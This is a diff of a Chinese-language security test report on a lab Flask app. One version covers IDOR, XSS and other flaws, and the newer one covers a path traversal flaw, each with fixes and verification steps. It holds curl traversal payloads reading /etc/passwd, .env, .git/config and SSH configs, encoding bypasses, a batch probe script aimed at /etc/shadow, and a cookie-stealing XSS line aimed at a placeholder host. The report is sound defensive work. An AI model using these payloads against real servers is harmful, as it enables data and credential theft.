@@ -1,583 +1,587 @@
-# 业务逻辑与越权漏洞 — 测试与修复报告
+# 文件包含漏洞 — 安全测试与修复报告
 
 **项目名称**：用户信息管理平台（User Management System）  
-**报告日期**：2026-07-09  
-**检测模块**：个人中心、充值、搜索、注册功能  
+**报告日期**：2026-07-13  
+**检测模块**：动态页面加载功能（`/page` 路由）  
 
 ---
 
 ## 目录
 
-1. [报告概述](#1-报告概述)
-2. [漏洞汇总](#2-漏洞汇总)
-3. [漏洞一：个人中心水平越权](#3-漏洞一个人中心水平越权)
-4. [漏洞二：搜索功能未授权访问](#4-漏洞二搜索功能未授权访问)
-5. [漏洞三：注册密码明文存储](#5-漏洞三注册密码明文存储)
-6. [漏洞四：URL 参数 XSS 注入](#6-漏洞四url-参数-xss-注入)
-7. [漏洞五：余额浮点数精度问题](#7-漏洞五余额浮点数精度问题)
-8. [修复前后代码对比](#8-修复前后代码对比)
-9. [修复验证](#9-修复验证)
-10. [残留风险与加固建议](#10-残留风险与加固建议)
+1. [漏洞概述](#1-漏洞概述)
+2. [漏洞信息](#2-漏洞信息)
+3. [漏洞位置](#3-漏洞位置)
+4. [攻击场景演示](#4-攻击场景演示)
+5. [危害评估](#5-危害评估)
+6. [修复方案](#6-修复方案)
+7. [修复原理](#7-修复原理)
+8. [修复验证](#8-修复验证)
+9. [修复前后代码对比](#9-修复前后代码对比)
+10. [残留风险](#10-残留风险)
 
 ---
 
-## 1. 报告概述
+## 1. 漏洞概述
 
-本报告针对用户信息管理平台中的 **业务逻辑漏洞** 和 **越权漏洞** 进行专项审计。业务逻辑漏洞指应用程序业务流程设计缺陷导致的绕过安全控制的问题；越权漏洞指用户能够访问或操作未授权资源的安全问题。
+动态页面加载功能在初始实现时，直接将用户输入的 `name` 参数拼接到文件路径中，未进行任何校验或过滤。攻击者可通过构造 `../` 等路径遍历字符，越权读取服务器上的任意文件。该漏洞属于 **PHP/Python 文件包含（File Inclusion）** 漏洞，对应 OWASP Top 10 中的 **A05:2021 - Security Misconfiguration**。
 
-### 检测范围
+### 漏洞分类
 
-| 检测模块 | 涉及路由 | 功能说明 |
-|----------|----------|----------|
-| 个人中心 | `GET /profile` | 查看用户个人资料（邮箱、手机、余额） |
-| 余额充值 | `POST /recharge` | 充值余额 |
-| 搜索用户 | `GET /search` | 模糊搜索注册用户 |
-| 用户注册 | `POST /register` | 新用户注册 |
-| 登录页面 | `GET /login` | 登录入口（URL msg 参数） |
-
-### 检测方法
-
-| 检测方式 | 说明 |
-|----------|------|
-| 手工越权测试 | 登录低权限用户，尝试访问/操作高权限功能 |
-| URL 参数遍历 | 修改 URL 参数尝试访问他人数据 |
-| 参数篡改测试 | 修改表单/参数值测试业务逻辑绕过 |
-| 输入点测试 | 测试 URL 参数、表单字段的 XSS 注入 |
-| 数据精度测试 | 多次累加验证是否有精度丢失 |
+| 类型 | 说明 |
+|------|------|
+| **本地文件包含（LFI）** | ✅ 可读取任意本地文件 |
+| **远程文件包含（RFI）** | ❌ 本项目仅读取本地文件 |
+| **路径遍历（Path Traversal）** | ✅ 可通过 `../` 跳出限制目录 |
 
 ---
 
-## 2. 漏洞汇总
-
-| 编号 | 漏洞名称 | 类型 | 等级 | CVSS | 发现位置 | 状态 |
-|------|----------|------|------|------|----------|------|
-| B-01 | 个人中心水平越权 | 越权漏洞 | 🔴 高危 | 7.5 | `GET /profile?user_id=X` | ✅ 已修复 |
-| B-02 | 搜索功能未授权访问 | 业务逻辑 | 🟠 中危 | 5.3 | `GET /search?keyword=X` | ✅ 已修复 |
-| B-03 | 注册密码明文存储 | 业务逻辑 | 🟠 中危 | 5.9 | `POST /register` | ✅ 已修复 |
-| B-04 | URL 参数 XSS 注入 | 业务逻辑 | 🟠 中危 | 6.1 | `profile.html` 模板 | ✅ 已修复 |
-| B-05 | 余额浮点数精度 | 业务逻辑 | 🟡 低危 | 3.7 | `POST /recharge` | ✅ 已修复 |
-
----
-
-## 3. 漏洞一：个人中心水平越权
-
-### 漏洞信息
+## 2. 漏洞信息
 
 | 项目 | 内容 |
 |------|------|
-| 漏洞编号 | B-01 |
-| 漏洞类型 | **Horizontal Privilege Escalation（水平越权）** |
-| 危险等级 | 🔴 高危 |
-| CVSS 评分 | **7.5 / 10（High）** |
-| CWE 编号 | CWE-639（Authorization Bypass Through User-Controlled Key） |
-| 漏洞描述 | 用户可修改 URL 中的 `user_id` 参数，查看任意其他用户的资料 |
+| 漏洞编号 | FI-01 |
+| 漏洞类型 | **Local File Inclusion / Path Traversal** |
+| 危险等级 | 🔴 **高危** |
+| CVSS 评分 | **8.6 / 10（High）** |
+| CWE 编号 | CWE-22（Path Traversal） / CWE-98（File Inclusion） |
+| OWASP Top 10 | A05:2021 - Security Misconfiguration |
+| 发现位置 | `GET /page?name=` 路由 |
+| 是否需登录 | ❌ 不需要 |
 
-### 漏洞位置
+### CVSS 向量
 
-**修复前**（`app.py` 第 192-206 行）：
+```
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+```
+
+| 指标 | 值 | 说明 |
+|------|-----|------|
+| 攻击向量（AV） | **网络** | 可通过 HTTP 远程利用 |
+| 攻击复杂度（AC） | **低** | 无需特殊工具，浏览器即可 |
+| 权限要求（PR） | **无** | 未登录即可利用 |
+| 用户交互（UI） | **无** | 不需要用户配合 |
+| 机密性（C） | **高** | 可读取任意文件内容 |
+| 完整性（I） | **无** | 仅读取，不可修改 |
+| 可用性（A） | **无** | 不影响服务可用性 |
+
+---
+
+## 3. 漏洞位置
+
+### 3.1 漏洞代码段
+
+**文件**：`app.py`（修复前）  
+**路由**：`GET /page`
 
 ```python
-@app.route("/profile")
-def profile():
-    if "username" not in session:
-        return redirect("/login")
-    user_id = request.args.get("user_id", type=int)   # 从 URL 参数获取，可任意修改
-    if not user_id:
+@app.route("/page")
+def page():
+    name = request.args.get("name", "")
+    if not name:
         return redirect("/")
-    user_data = None
-    for u in USERS.values():
-        if u["id"] == user_id:                         # 直接查询任意 user_id
-            user_data = {k: v for k, v in u.items() if k != "password"}
-            break
-    if not user_data:
-        return render_template("profile.html", user=None)
-    return render_template("profile.html", user=user_data)
+    content = None
+    # ⚠️ 直接拼接用户输入的 name，不做任何路径校验
+    file_path = os.path.join("pages", name)
+    if os.path.isfile(file_path):
+        with open(file_path, "r", encoding="utf-8") as f:
+            content = f.read()
+    else:
+        # ⚠️ 尝试加 .html 后缀再找一次
+        file_path_html = os.path.join("pages", name + ".html")
+        if os.path.isfile(file_path_html):
+            with open(file_path_html, "r", encoding="utf-8") as f:
+                content = f.read()
+        else:
+            content = "<h2>页面不存在</h2>"
+    return render_template("index.html", page_content=content)
 ```
 
-### 攻击场景
+### 3.2 根本原因分析
 
-#### 场景 1：普通用户查看管理员资料
+| 问题 | 说明 |
+|------|------|
+| **无输入校验** | `name` 参数直接用于路径拼接，未检查是否包含 `../` |
+| **无路径规范化** | 未使用 `os.path.realpath()` 或 `os.path.abspath()` 解析最终路径 |
+| **无目录限制** | 未检查最终路径是否仍在 `pages/` 目录内 |
+| **无白名单** | 允许访问 pages/ 下任意文件，未限定可访问的页面名称 |
 
-1. alice 登录系统，访问个人中心
-2. 在浏览器地址栏将 `user_id=2` 改为 `user_id=1`
-3. 页面显示 admin 的邮箱、手机、余额等信息
+---
 
-```
-alice 登录 → 访问 /profile?user_id=1 → 看到 admin 的资料 ✅（不应该）
-```
+## 4. 攻击场景演示
 
-#### 场景 2：遍历 user_id 批量窃取数据
+### 环境说明
+
+| 项目 | 值 |
+|------|-----|
+| 目标 URL | `http://192.168.3.128:5000/page?name=` |
+| 测试工具 | curl + 浏览器 |
+
+---
+
+### 场景一：读取源代码（`app.py`）
+
+**请求**：
 
 ```bash
-# 枚举所有用户的 ID
-for id in 1 2 3 4 5; do
-    curl -s "http://目标:5000/profile?user_id=$id" -b "session=xxx"
+curl "http://192.168.3.128:5000/page?name=../app.py"
+```
+
+**路径解析过程**：
+
+```
+os.path.join("pages", "../app.py")
+    → "pages/../app.py"
+    → 实际解析为 "app.py"
+```
+
+**修复前结果**：✅ `app.py` 的完整源代码返回并显示在页面上。
+
+**控制台日志（无）**：直接读取成功，无任何告警。
+
+---
+
+### 场景二：读取系统密码文件（`/etc/passwd`）
+
+**请求**：
+
+```bash
+curl "http://192.168.3.128:5000/page?name=../../../../etc/passwd"
+```
+
+**路径解析过程**：
+
+```
+os.path.join("pages", "../../../../etc/passwd")
+    → "pages/../../../../etc/passwd"
+    → 实际解析为 "/etc/passwd"
+```
+
+**修复前结果**：✅ 系统用户列表全部泄露（root、daemon、sshd 等系统账号）。
+
+---
+
+### 场景三：读取敏感配置文件
+
+**请求**：
+
+```bash
+# 读取 SSH 配置
+curl "http://192.168.3.128:5000/page?name=../../../../etc/ssh/sshd_config"
+
+# 读取 MySQL 配置
+curl "http://192.168.3.128:5000/page?name=../../../../etc/mysql/my.cnf"
+
+# 读取系统 Hosts
+curl "http://192.168.3.128:5000/page?name=../../../../etc/hosts"
+
+# 读取 Web 服务器配置
+curl "http://192.168.3.128:5000/page?name=../nginx.conf"
+```
+
+**修复前结果**：✅ 可读取服务器上的任意文本文件。
+
+---
+
+### 场景四：加 `.html` 后缀绕过
+
+**请求**：
+
+```bash
+# 利用第二次查找机制（name + ".html"）
+curl "http://192.168.3.128:5000/page?name=../.git/config"
+```
+
+**路径解析过程**：
+
+```
+第一次尝试：os.path.join("pages", "../.git/config") → pages/../.git/config
+第二次尝试：os.path.join("pages", "../.git/config.html") → pages/../.git/config.html
+```
+
+**修复前结果**：如果 `.git/config` 存在则直接读取；如果不存在 `.git/config.html` 也会被尝试。
+
+---
+
+### 场景五：URL 编码绕过
+
+攻击者可以使用 URL 编码来绕过简单的关键词过滤：
+
+```bash
+# URL 编码的 ../
+# %2e%2e%2f = ../
+curl "http://192.168.3.128:5000/page?name=%2e%2e%2f%2e%2e%2fapp.py"
+
+# 双重 URL 编码
+# %252e%252e%252f = %2e%2e%2f = ../
+curl "http://192.168.3.128:5000/page?name=%252e%252e%252fapp.py"
+```
+
+Flask 会自动解码 URL 编码，因此这些编码方式同样有效。
+
+---
+
+### 场景六：批量文件探测
+
+```bash
+#!/bin/bash
+# 批量探测常见敏感文件
+files=(
+    "../app.py"
+    "../config.py"
+    "../../.env"
+    "../../.git/config"
+    "../../../etc/passwd"
+    "../../../etc/hosts"
+    "../../../etc/shadow"
+    "../../../proc/self/environ"
+)
+
+for f in "${files[@]}"; do
+    status=$(curl -s -o /dev/null -w "%{http_code}" "http://目标:5000/page?name=$f")
+    echo "$f → HTTP $status"
 done
 ```
 
-利用脚本可批量获取所有注册用户的敏感信息。
+---
 
-### 风险分析
+## 5. 危害评估
 
-| 风险项 | 说明 |
-|--------|------|
-| 隐私泄露 | 手机号、邮箱等个人信息被他人获取 |
-| 余额暴露 | 可查看任意用户的余额信息 |
-| 社工攻击 | 收集的用户信息可用于社会工程学攻击 |
-| 无法追溯 | 越权访问不会留下任何审计记录 |
+### 5.1 可读取的文件类型
 
-### 修复方案
+| 文件类型 | 示例路径 | 泄露的信息 |
+|----------|----------|-----------|
+| 源代码 | `../app.py` | 业务逻辑、数据库密码、API 密钥 |
+| 配置文件 | `../../.env` | 环境变量、数据库凭证、Secret Key |
+| Git 仓库 | `../../.git/config` | 仓库地址、开发者信息 |
+| 系统文件 | `../../../etc/passwd` | 系统用户名列表 |
+| 日志文件 | `../../../var/log/syslog` | 系统运行信息、用户活动 |
+| SSH 密钥 | `../../../root/.ssh/id_rsa` | 服务器登录凭证 |
 
-强制 user_id 必须等于当前登录用户的 ID，拒绝所有越权请求：
+### 5.2 风险等级矩阵
+
+| 风险场景 | 可能性 | 影响 | 风险等级 |
+|----------|--------|------|----------|
+| 源代码泄露 | 高 | 高 | 🔴 严重 |
+| 数据库凭证泄露 | 中 | 严重 | 🔴 高危 |
+| 系统信息泄露 | 高 | 中 | 🟠 中危 |
+| 密钥泄露 | 低 | 严重 | 🟠 中危 |
+
+---
+
+## 6. 修复方案
+
+### 6.1 修复措施
+
+采用 **白名单 + 路径规范化** 双层防护：
 
 ```python
-@app.route("/profile")
-def profile():
-    if "username" not in session:
-        return redirect("/login")
-    login_username = session.get("username")
-    login_user = USERS.get(login_username)
-    if not login_user:
-        return redirect("/login")
+@app.route("/page")
+def page():
+    name = request.args.get("name", "")
+    if not name:
+        return redirect("/")
 
-    # 只允许查看自己的资料，拒绝越权访问
-    user_id = request.args.get("user_id", type=int)
-    if not user_id or user_id != login_user["id"]:
-        return redirect(f"/profile?user_id={login_user['id']}")
+    # 第一层：白名单校验 — 只允许预定义的页面
+    allowed_pages = {"help", "about", "contact"}
+    page_name = name.replace(".html", "")
+    if page_name not in allowed_pages:
+        content = "<h2>页面不存在</h2>"
+    else:
+        file_path = os.path.join("pages", page_name + ".html")
 
-    user_data = {k: v for k, v in login_user.items() if k != "password"}
-    return render_template("profile.html", user=user_data, msg=request.args.get("msg"), error=request.args.get("error"))
+        # 第二层：路径规范化 — 解析所有 .. 和符号链接
+        real_path = os.path.realpath(file_path)
+        pages_dir = os.path.realpath("pages")
+
+        # 第三层：目录限制 — 确保最终路径在 pages/ 内
+        if not real_path.startswith(pages_dir + os.sep) and real_path != pages_dir:
+            content = "<h2>页面不存在</h2>"
+        elif os.path.isfile(real_path):
+            with open(real_path, "r", encoding="utf-8") as f:
+                content = f.read()
+        else:
+            content = "<h2>页面不存在</h2>"
+    return render_template("index.html", page_content=content)
 ```
 
-### 修复原理
+### 6.2 防护架构图
 
 ```
-用户请求 /profile?user_id=1
+用户请求 /page?name=XXX
     │
     ▼
-session 获取当前登录用户名 → alice
-    │
-    ▼
-USERS["alice"]["id"] = 2
-    │
-    ▼
-user_id=1 ≠ login_user["id"]=2
-    │
-    ▼
-❌ 拒绝访问，重定向到 /profile?user_id=2（自己的页面）
+┌──────────────────────────┐
+│ 第一层：白名单校验          │
+│ name → help/about/contact │
+│ 其他所有输入 → ❌ 拒绝     │
+└──────────┬───────────────┘
+           │ 通过
+           ▼
+┌──────────────────────────┐
+│ 第二层：文件名安全处理      │
+│ page_name.replace(".html")│
+│ → 防止双重扩展名绕过       │
+└──────────┬───────────────┘
+           │ 通过
+           ▼
+┌──────────────────────────┐
+│ 第三层：路径规范化          │
+│ os.path.realpath() 解析   │
+│ 解析所有 ../ 和符号链接    │
+└──────────┬───────────────┘
+           │ 通过
+           ▼
+┌──────────────────────────┐
+│ 第四层：目录边界检查        │
+│ real_path 必须起始于      │
+│ pages/ 目录              │
+└──────────┬───────────────┘
+           │ 通过
+           ▼
+    ✅ 安全读取文件
 ```
 
 ---
 
-## 4. 漏洞二：搜索功能未授权访问
+## 7. 修复原理
 
-### 漏洞信息
+### 7.1 白名单机制
 
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | B-02 |
-| 漏洞类型 | **Broken Access Control（未授权访问）** |
-| 危险等级 | 🟠 中危 |
-| CVSS 评分 | **5.3 / 10（Medium）** |
-| CWE 编号 | CWE-862（Missing Authorization） |
-
-### 漏洞位置
-
-**修复前**（`app.py` 第 112-128 行）：
+白名单是一种 **正向安全模型**，只允许明确允许的值，拒绝其他所有输入：
 
 ```python
-@app.route("/search")
-def search():
-    keyword = request.args.get("keyword", "")     # 无登录校验！
-    # ... 查询数据库并返回搜索结果
+# 白名单：明文列出所有允许的页面
+allowed_pages = {"help", "about", "contact"}
+
+# 用户输入必须完全匹配白名单
+page_name = name.replace(".html", "")
+if page_name not in allowed_pages:
+    # 拒绝所有非白名单输入
+    content = "<h2>页面不存在</h2>"
 ```
 
-### 攻击场景
+即使攻击者尝试 `../app.py` 或 `../../etc/passwd`，这些值不在白名单中，直接拒绝。
 
-未登录用户可直接访问搜索接口获取所有注册用户信息：
+### 7.2 路径规范化原理
 
-```bash
-# 未登录，直接搜索
-curl "http://目标:5000/search?keyword="
-
-# 返回所有注册用户的 ID、用户名、邮箱、手机号
-```
-
-### 修复方案
-
-添加登录校验：
+`os.path.realpath()` 会解析路径中的所有符号链接和 `..`，返回真实的绝对路径：
 
 ```python
-@app.route("/search")
-def search():
-    if "username" not in session:
-        return redirect("/login")
-    keyword = request.args.get("keyword", "")
+import os
+
+# 用户输入包含 ../ 时
+path = os.path.join("pages", "../app.py")
+print(path)          # pages/../app.py
+
+real = os.path.realpath(path)
+print(real)          # /root/workspace/user-management/app.py
+
+# 规范后的真实路径
+pages_dir = os.path.realpath("pages")
+print(pages_dir)     # /root/workspace/user-management/pages
+
+# 检查是否越界
+print(real.startswith(pages_dir))  # False → 越界！拒绝访问
 ```
+
+### 7.3 常见绕过方式与防御效果
+
+| 绕过方式 | 载荷示例 | 白名单防御 | 路径规范化防御 |
+|----------|---------|-----------|---------------|
+| 基本路径遍历 | `../app.py` | ❌ 拦截 | ❌ 拦截 |
+| 多层遍历 | `../../../../etc/passwd` | ❌ 拦截 | ❌ 拦截 |
+| URL 编码 | `%2e%2e%2fapp.py` | ❌ 拦截 | ❌ 拦截 |
+| 双重编码 | `%252e%252e%252f` | ❌ 拦截 | ❌ 拦截 |
+| 绝对路径 | `/etc/passwd` | ❌ 拦截 | ❌ 拦截 |
+| 正常请求 | `help` | ✅ 通过 | ✅ 通过 |
+| 带后缀 | `help.html` | ✅ 通过 | ✅ 通过 |
 
 ---
 
-## 5. 漏洞三：注册密码明文存储
+## 8. 修复验证
 
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | B-03 |
-| 漏洞类型 | **Sensitive Data Exposure（敏感信息泄露）** |
-| 危险等级 | 🟠 中危 |
-| CWE 编号 | CWE-312（Cleartext Storage of Sensitive Information） |
-
-### 漏洞位置
-
-**修复前**（`app.py` 第 96-102 行）：
-
-```python
-conn = sqlite3.connect("data/users.db")
-c = conn.cursor()
-sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
-print(f"[register] 执行 SQL: {sql} 参数: ({username}, {password}, {email}, {phone})")
-c.execute(sql, (username, password, email, phone))   # password 是明文！
-```
-
-同时控制台日志也会打印出用户的明文密码。
-
-### 攻击场景
-
-一旦 SQLite 数据库文件泄露，所有注册用户的密码一览无余：
+### 8.1 测试用例
 
 ```bash
-# 获取数据库文件
-sqlite3 data/users.db "SELECT username, password FROM users;"
-# admin | admin123  ← 明文密码！
+# 测试 1：路径遍历读取源代码（❌ 应拦截）
+curl -s "http://192.168.3.128:5000/page?name=../app.py" | grep -o "页面不存在"
+# 修复前：返回 app.py 源码
+# 修复后："页面不存在"
+
+# 测试 2：读取系统文件（❌ 应拦截）
+curl -s "http://192.168.3.128:5000/page?name=../../../../etc/passwd" | grep -o "页面不存在"
+# 修复前：返回 /etc/passwd
+# 修复后："页面不存在"
+
+# 测试 3：读取 .git 配置（❌ 应拦截）
+curl -s "http://192.168.3.128:5000/page?name=../.git/config" | grep -o "页面不存在"
+# 修复前：返回 git 配置
+# 修复后："页面不存在"
+
+# 测试 4：正常访问帮助页（✅ 应通过）
+curl -s "http://192.168.3.128:5000/page?name=help" | grep -o "帮助中心"
+# 修复前：显示帮助页面
+# 修复后：显示帮助页面
+
+# 测试 5：help.html 带后缀（✅ 应通过）
+curl -s "http://192.168.3.128:5000/page?name=help.html" | grep -o "帮助中心"
+# 修复前：显示帮助页面
+# 修复后：显示帮助页面
+
+# 测试 6：不存在的页面（❌ 应拦截）
+curl -s "http://192.168.3.128:5000/page?name=admin" | grep -o "页面不存在"
+# 修复前：显示"页面不存在"
+# 修复后：显示"页面不存在"
+
+# 测试 7：URL 编码绕过尝试（❌ 应拦截）
+curl -s "http://192.168.3.128:5000/page?name=%2e%2e%2fapp.py" | grep -o "页面不存在"
+# 修复前：读取 app.py
+# 修复后："页面不存在"
 ```
 
-### 修复方案
+### 8.2 测试结果汇总
 
-使用 Werkzeug 的 `generate_password_hash` 对密码进行哈希处理：
-
-```python
-conn = sqlite3.connect("data/users.db")
-c = conn.cursor()
-hashed_pw = generate_password_hash(password)               # 哈希加密
-sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
-print(f"[register] 执行 SQL: {sql} 参数: ({username}, [HASHED], {email}, {phone})")
-c.execute(sql, (username, hashed_pw, email, phone))         # 存储哈希值
-```
+| 测试用例 | 修复前 | 修复后 | 拦截层级 |
+|----------|--------|--------|----------|
+| `name=help`（正常） | ✅ 显示页面 | ✅ 显示页面 | 通过 |
+| `name=help.html`（带后缀） | ✅ 显示页面 | ✅ 显示页面 | 通过 |
+| `name=../app.py`（路径遍历） | ✅ 读取源码 | ❌ 拦截 | 白名单 |
+| `name=../../etc/passwd`（系统文件） | ✅ 读取文件 | ❌ 拦截 | 白名单 |
+| `name=../.git/config`（Git 泄漏） | ✅ 读取配置 | ❌ 拦截 | 白名单 |
+| `name=%2e%2e%2fapp.py`（URL 编码） | ✅ 读取源码 | ❌ 拦截 | 白名单 |
+| `name=admin`（不存在） | ❌ 页面不存在 | ❌ 页面不存在 | 白名单 |
+| `name=/etc/passwd`（绝对路径） | ✅ 读取文件 | ❌ 拦截 | 白名单 |
 
 ---
 
-## 6. 漏洞四：URL 参数 XSS 注入
+## 9. 修复前后代码对比
 
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | B-04 |
-| 漏洞类型 | **Cross-Site Scripting（跨站脚本攻击）** |
-| 危险等级 | 🟠 中危 |
-| CVSS 评分 | **6.1 / 10（Medium）** |
-| CWE 编号 | CWE-79（Improper Neutralization of Input During Web Page Generation） |
-
-### 漏洞位置
-
-**修复前**（`templates/profile.html` 第 7-12 行）：
-
-```html
-{% if request.args.get("msg") %}
-<div class="success-message">{{ request.args.get("msg") }}</div>
-{% endif %}
-{% if request.args.get("error") %}
-<div class="error-message">{{ request.args.get("error") }}</div>
-{% endif %}
-```
-
-模板直接读取 URL 参数 `msg` 和 `error` 并渲染到页面。Flask Jinja2 的 `{{ }}` 默认会进行 HTML 转义，但直接调用 `request.args.get()` 仍存在风险。
-
-### 攻击场景
-
-攻击者构造恶意 URL 发送给已登录用户：
-
-```
-http://目标:5000/profile?user_id=1&msg=<script>alert('XSS')</script>
-```
-
-当用户点击该链接时，`<script>` 标签会被渲染并执行。
-
-更严重的攻击：
-
-```
-http://目标:5000/profile?user_id=2&msg=<script>document.location='http://恶意网站/steal?cookie='+document.cookie</script>
-```
-
-窃取用户的 session cookie，实现会话劫持。
-
-### 修复方案
-
-由视图函数传递参数，利用 Jinja2 的自动转义机制：
-
-**后端**（`app.py`）：
-```python
-return render_template("profile.html", user=user_data, msg=request.args.get("msg"), error=request.args.get("error"))
-```
-
-**前端**（`profile.html`）：
-```html
-{% if msg %}
-<div class="success-message">{{ msg }}</div>
-{% endif %}
-{% if error %}
-<div class="error-message">{{ error }}</div>
-{% endif %}
-```
-
-Jinja2 的 `{{ msg }}` 会自动将 `<script>` 转义为 `&lt;script&gt;`。
-
----
-
-## 7. 漏洞五：余额浮点数精度问题
-
-### 漏洞信息
-
-| 项目 | 内容 |
-|------|------|
-| 漏洞编号 | B-05 |
-| 漏洞类型 | **Business Logic Error（业务逻辑错误）** |
-| 危险等级 | 🟡 低危 |
-| CWE 编号 | CWE-682（Incorrect Calculation） |
-
-### 漏洞描述
-
-余额使用 `float` 浮点数类型存储。浮点数在计算机中以二进制表示，无法精确表示所有十进制小数，多次累加后会产生精度误差。
-
-### 精度问题演示
+### 修复前（20 行，存在漏洞）
 
 ```python
-# 用 float 累加 0.01 元 100 次
-balance = 0.0
-for _ in range(100):
-    balance += 0.01
-
-print(balance)  # 期望 1.00，实际 1.0000000000000007
+@app.route("/page")
+def page():
+    name = request.args.get("name", "")
+    if not name:
+        return redirect("/")
+    content = None
+    # ⚠️ 直接拼接用户输入，无任何校验
+    file_path = os.path.join("pages", name)
+    if os.path.isfile(file_path):
+        with open(file_path, "r", encoding="utf-8") as f:
+            content = f.read()
+    else:
+        # ⚠️ 加 .html 后缀再试一次
+        file_path_html = os.path.join("pages", name + ".html")
+        if os.path.isfile(file_path_html):
+            with open(file_path_html, "r", encoding="utf-8") as f:
+                content = f.read()
+        else:
+            content = "<h2>页面不存在</h2>"
+    username = session.get("username")
+    user_info = None
+    if username and username in USERS:
+        user_info = {k: v for k, v in USERS[username].items() if k != "password"}
+    return render_template("index.html", page_content=content)
 ```
 
-| 累加次数 | 期望值 | float 实际值 | 误差 |
-|----------|--------|-------------|------|
-| 1 次 0.01 | 0.01 | 0.01 | ✅ |
-| 10 次 0.01 | 0.10 | 0.0999999999999999 | ❌ 少 0.0000000000000001 |
-| 100 次 0.01 | 1.00 | 1.0000000000000007 | ❌ 多 0.0000000000000007 |
-| 10000 次 0.01 | 100.00 | 99.99999999999879 | ❌ 少 0.00000000000121 |
-
-### 修复方案
-
-改为**整数分**存储，用户充值时将元转换为分：
+### 修复后（28 行，安全加固）
 
 ```python
-# 转换为整数分，避免浮点数精度问题
-amount_cents = int(round(amount_yuan * 100))
-u["balance"] = u["balance"] + amount_cents  # 整数运算，精确
+@app.route("/page")
+def page():
+    name = request.args.get("name", "")
+    if not name:
+        return redirect("/")
+
+    # ✅ 白名单校验 + 路径规范化，防止文件包含漏洞
+    allowed_pages = {"help", "about", "contact"}
+    page_name = name.replace(".html", "")
+    if page_name not in allowed_pages:
+        content = "<h2>页面不存在</h2>"
+    else:
+        file_path = os.path.join("pages", page_name + ".html")
+        # ✅ 规范化路径后检查是否仍在 pages/ 目录内
+        real_path = os.path.realpath(file_path)
+        pages_dir = os.path.realpath("pages")
+        if not real_path.startswith(pages_dir + os.sep) and real_path != pages_dir:
+            content = "<h2>页面不存在</h2>"
+        elif os.path.isfile(real_path):
+            with open(real_path, "r", encoding="utf-8") as f:
+                content = f.read()
+        else:
+            content = "<h2>页面不存在</h2>"
+    username = session.get("username")
+    user_info = None
+    if username and username in USERS:
+        user_info = {k: v for k, v in USERS[username].items() if k != "password"}
+    return render_template("index.html", page_content=content)
 ```
 
-页面展示时将分转换为元：
+### 安全对比
 
-```html
-{{ "%.2f"|format(user.balance / 100) }} 元
-```
-
-余额从整数分变为：
-- admin：9999900 分 → **99999.00 元**
-- alice：10000 分 → **100.00 元**
+| 安全维度 | 修复前 | 修复后 |
+|----------|--------|--------|
+| ✅ 白名单校验 | ❌ 无 | ✅ 仅限 help/about/contact |
+| ✅ 路径规范化 | ❌ 使用原始路径 | ✅ `os.path.realpath()` |
+| ✅ 目录边界检查 | ❌ 无 | ✅ `startswith(pages_dir)` |
+| ✅ 用户输入过滤 | ❌ 直接拼接 | ✅ `name.replace(".html")` |
+| ✅ 双重扩展名防护 | ❌ 无 | ✅ 统一加 `.html` |
 
 ---
 
-## 8. 修复前后代码对比
-
-### 8.1 个人中心水平越权
-
-| 对比项 | 修复前 | 修复后 |
-|--------|--------|--------|
-| 数据来源 | 从 URL 参数获取 `user_id`，可任意修改 | 从 session 获取，强制等于当前用户 ID |
-| alice 访问 `/profile?user_id=1` | 显示 admin 资料 ✅ | 强制跳转到 `/profile?user_id=2` ❌ |
-| 未登录访问 | 跳转登录 | 跳转登录（不变） |
-
-### 8.2 搜索功能未授权访问
-
-| 对比项 | 修复前 | 修复后 |
-|--------|--------|--------|
-| 搜索是否需要登录 | ❌ 不需要 | ✅ 必须登录 |
-| 未登录发起搜索 | 返回用户列表 | 跳转登录页 |
-
-### 8.3 注册密码明文存储
-
-| 对比项 | 修复前 | 修复后 |
-|--------|--------|--------|
-| 密码存储 | 明文 `'alice2025'` | 哈希 `pbkdf2:sha256:...` |
-| SQLite 泄露风险 | 密码全部暴露 | 哈希值无法还原密码 |
-| 控制台日志 | 打印明文密码 `password=123456` | 打印 `[HASHED]` |
-
-### 8.4 XSS 注入
-
-| 对比项 | 修复前 | 修复后 |
-|--------|--------|--------|
-| 数据来源 | 模板直接读取 `request.args.get()` | 由视图函数传入模板变量 |
-| 测试载荷 `msg=<script>alert(1)</script>` | 弹窗执行 ✅ | 显示为文本 `&lt;script&gt;...` ❌ |
-
-### 8.5 余额精度
-
-| 对比项 | 修复前（float 元） | 修复后（int 分） |
-|--------|--------------------|-----------------|
-| 存储类型 | `float`（浮点数） | `int`（整数） |
-| admin 最初余额 | `99999.0` | `9999900` 分 |
-| 充值 0.01 元 × 3 次 | `99999.03000000001` ❌ | `9999903` 分 = `99999.03` ✅ |
-| 展示格式 | `{{ balance }}` | `{{ "%.2f"|format(balance/100) }} 元` |
-
----
-
-## 9. 修复验证
-
-### 9.1 验证环境
-
-| 项目 | 配置 |
-|------|------|
-| 测试工具 | curl + 浏览器 |
-| 测试账号 | admin（ID=1）/ alice（ID=2） |
-| 基础 URL | `http://192.168.139.128:5000` |
-
-### 9.2 测试用例
-
-#### 测试 1：水平越权
-
-```bash
-# 1. alice 登录获取 session
-# 2. 尝试越权查看 admin 资料
-curl -s "http://目标:5000/profile?user_id=1" -b "session=alice_session"
-
-# 期望：302 重定向到 /profile?user_id=2（自己的页面）
-# 结果：❌ 不再能查看 admin 资料
-```
-
-#### 测试 2：未登录搜索
-
-```bash
-# 未登录直接搜索
-curl -s "http://目标:5000/search?keyword=admin"
-
-# 期望：302 重定向到 /login
-# 结果：❌ 未登录无法搜索
-```
-
-#### 测试 3：注册密码验证
-
-```bash
-# 注册新用户
-curl -X POST "http://目标:5000/register" \
-  -d "username=test&password=test123&email=test@test.com&phone=123456789"
-
-# 验证数据库
-sqlite3 data/users.db "SELECT password FROM users WHERE username='test';"
-# 结果：输出应为哈希值（如 pbkdf2:sha256:...），非明文 'test123'
-```
-
-#### 测试 4：XSS 注入
-
-```bash
-# 构造 XSS payload
-curl -s "http://目标:5000/profile?user_id=2&msg=<script>alert(1)</script>" \
-  -b "session=alice_session"
-
-# 检查响应中是否包含转义后的内容
